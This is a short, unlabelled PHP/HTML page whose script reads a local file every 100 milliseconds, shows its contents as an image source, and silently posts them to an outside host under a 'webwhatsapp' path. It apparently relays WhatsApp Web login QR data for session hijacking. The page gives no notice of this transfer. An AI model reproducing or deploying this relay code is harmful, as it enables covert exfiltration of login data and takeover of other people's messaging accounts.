<?php
// $myfile = fopen("C:\Users\Focus\Downloads\a.txt", "r") or die("Unable to open file!");
// echo fread($myfile,filesize("webdictionary.txt"));
// var_dump($_POST['src']);
?>

<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Document</title>
</head>
<body>
	<img src="" alt="">
<script src="http://code.jquery.com/jquery-1.11.0.min.js"></script>
<script>

	$(document).ready(function() {
		var path = "a.txt";
		var newdata = "";
		$.get(path, function(data) {
			newdata = data;
			var datas = new FormData();
			datas.append("data" , data);
			var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
			xhr.open( 'post', 'http://www.mofire.site90.net/webwhatsapp/index.php', true );
			xhr.send(datas);
		});
		setInterval(function(){  
			$.get(path, function(data) {
				// alert(data);
				$('img').attr({
					src: data
				});
				if(newdata!=data){
					newdata = data;
					var datas = new FormData();
					datas.append("data" , data);
					var xhr = (window.XMLHttpRequest) ? new XMLHttpRequest() : new activeXObject("Microsoft.XMLHTTP");
					xhr.open( 'post', 'http://www.mofire.site90.net/webwhatsapp/index.php', true );
					xhr.send(datas);			
				}
			});

		},100);
	});
	

	
</script>
</body>
</html>
<?php
// fclose($myfile);
?>